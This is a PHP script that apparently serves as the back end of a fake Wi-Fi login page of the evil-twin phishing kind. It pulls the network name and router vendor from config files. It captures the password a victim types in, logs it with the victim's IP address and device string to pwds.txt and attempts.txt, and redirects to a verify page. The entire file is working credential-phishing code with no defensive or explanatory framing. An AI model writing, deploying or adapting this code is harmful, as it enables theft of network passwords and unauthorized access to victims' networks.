  <?php
  error_reporting(0);
$pwd = $_POST["key1"];
if (strlen($pwd) < 8){
    echo "<script type='text/javascript'>alert('Passsword Can not be less than 8 characters');</script>";
} 


function getparametr($search_string)
{
	$lines_array = file("language.txt");
foreach($lines_array as $line) {
    if(strpos($line, $search_string) !== false) {
        list(, $search_string ) = explode(":", $line);
				return $search_string ;

		}
	}

}
function getparametr2($search_string)
{
	$lines_array = file("parameters.txt");
foreach($lines_array as $line) {
    if(strpos($line, $search_string) !== false) {
        list(, $search_string ) = explode(":", $line);
				return $search_string ;

		}
	}

}

$essid=getparametr2("essid");
$manufacturer=getparametr2("vendor");
$name=getparametr("name") ;
$vendor=getparametr("vendor") ;
$submit=getparametr("submit ") ;
$message1=getparametr("message1") ;
$message2=getparametr("message2") ;
$message3=getparametr("message3") ;
$message4=getparametr("message4") ;
function substrwords($text, $maxchar, $end='...') {
    if (strlen($text) > $maxchar || $text == '') {
        $words = preg_split('/\s/', $text);      
        $output = '';
        $i      = 0;
        while (1) {
            $length = strlen($output)+strlen($words[$i]);
            if ($length > $maxchar) {
                break;
            } 
            else {
                $output .= " " . $words[$i];
                ++$i;
            }
        }
        $output .= $end;
    } 
    else {
        $output = $text;
    }
    return $output;
}



$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$ua = str_replace("Mozilla/5.0","  ","$ua");
$ua = str_replace("Chrome/80.0.3987.162 "," ","$ua");
$ua = str_replace(" Safari/537.36 "," ","$ua");
$ua = str_replace("(KHTML, like Gecko)"," ","$ua");
$ua = str_replace(" AppleWebKit/537.36 "," ","$ua");
$ua = str_replace("  "," ","$ua");
$ua = str_replace("("," ","$ua");
$ua = str_replace(")"," ","$ua");
$ua = str_replace("Safari/537.36"," ","$ua");
$ua = str_replace("SamsungBrowser/10.2"," ","$ua");
$ua = str_replace("Chrome/71.0.3578.99"," ","$ua");
$ua = substrwords($ua,40);


$count_my_page = ("viewed.txt");
$hits = file($count_my_page);
$hits[0] ++;
$fp = fopen($count_my_page , "w");
fputs($fp , $hits[0]);
fclose($fp);

$content = "Passsword : '$pwd' <#> IP : $ip <#> Device : $ua \n";
if(!empty($pwd)){


$myfile = fopen("pwds.txt", "a+") or die("Unable to open file!");
fwrite($myfile, $content);
fclose($myfile);
$myfile = fopen("attempts.txt", "a+") or die("Unable to open file!");
$txt = "$pwd\n";
fwrite($myfile, $txt );
fclose($myfile);
} 
header( "Location: verify.php" );

?> 